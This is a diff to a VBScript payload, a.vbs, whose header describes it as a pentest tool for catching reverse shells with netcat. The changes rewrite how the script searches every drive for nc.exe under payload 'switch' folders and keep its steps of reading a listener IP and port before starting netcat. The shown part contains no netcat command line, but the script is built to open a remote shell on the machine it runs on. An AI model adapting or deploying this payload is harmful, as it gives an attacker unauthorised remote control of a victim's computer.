@@ -3,7 +3,7 @@ Option Explicit
 '==============================================================================
 ' Title:         a.vbs
 ' Author:        RalphyZ
-' Version:       1.0
+' Version:       1.1
 ' Target:        Windows 7+
 '
 ' Description:
@@ -16,7 +16,8 @@ Option Explicit
 ' listeners while doing a PenTest, and grab multiple reverse
 ' shells in one trip.  Uncomment that if you want the auto-increment
 '
-' Note: You must put the netcat executable in the strReverseShellPath directory
+' Note: You must put the netcat executable in the switch directory with this 
+'       script in order for it to work
 '==============================================================================
 
 ' Declare Constants
@@ -26,13 +27,10 @@ Const ForWriting = 2
 ' Declare Global Variables
 Dim strListenerPort, strNewListenerPort, strListenerIP
 Dim objFSO, objFile, strCurrentDirectory
-Dim strNetCatEXE, strReverseShellPath, strListnerPortFile, strListenerIPFile
+Dim strNetCatEXE, strListnerPortFile, strListenerIPFile
 
 ' The netcat executable name
 strNetCatEXE = "nc.exe"
-
-' The folder location
-strReverseShellPath = "\payloads\library\RAZ_ReverseShell\"
 
 ' The file containing the listener port
 strListnerPortFile = "listener_port.txt"
@@ -43,7 +41,11 @@ strListenerIPFile = "listener_ip.txt"
 ' Create a File System Object
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-strCurrentDirectory = FindCurrentDirectory()
+' Set default value
+strCurrentDirectory = ""
+    
+' The folder location
+FindCurrentDirectory
 
 ' Read the Host IP Address (where the listener resides)
 ReadHostIP
@@ -64,20 +66,21 @@ StartNetCat
 ' Return Value: None
 ' Description: Find the netcat executable
 '==============================================================================
-Function FindCurrentDirectory
+sub FindCurrentDirectory
     Dim objDrives, d
-    
-    ' Set default return value
-    FindCurrentDirectory = ""
-    
+           
     ' Search all drives for the netcat exe
     Set objDrives = objFSO.Drives
-    For Each d in objDrives   
-        If (objFSO.FileExists(d + strReverseShellPath + strNetCatEXE)) Then
-            FindCurrentDirectory =  d + strReverseShellPath        
+    For Each d in objDrives
+        If (objFSO.FileExists(d + "\payloads\switch1\" + strNetCatEXE)) Then
+            strCurrentDirectory =  d + "\payloads\switch1\"
+            exit sub
+        ElseIf (objFSO.FileExists(d + "\payloads\switch2\" + strNetCatEXE)) Then
+            strCurrentDirectory =  d + "\payloads\switch2\"
+            exit sub
         End if
     Next
-End Function
+End Sub
 
 '==============================================================================
 '       Name: ReadHostIP
